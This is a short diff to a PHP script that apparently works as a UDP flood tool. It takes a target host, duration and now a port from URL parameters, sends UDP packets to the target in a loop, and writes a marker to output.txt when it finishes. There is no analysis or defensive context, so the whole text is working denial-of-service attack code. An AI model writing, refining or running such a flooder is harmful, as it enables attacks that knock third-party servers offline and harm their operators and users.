@@ -25,13 +25,16 @@ if (isset($_GET['host'])&&isset($_GET['time']))
 		{
 			break;
 		}
-		$rand = rand(1,65000);
-		$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
+		$port = $_GET['port'];
+		$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 5);
 		if($fp)
 		{
 			fwrite($fp, $out);
 			fclose($fp);
 		}
     }
+	$fp = fopen('output.txt', 'w');
+	fwrite($fp, '1');
+	fclose($fp);
 }
 ?>
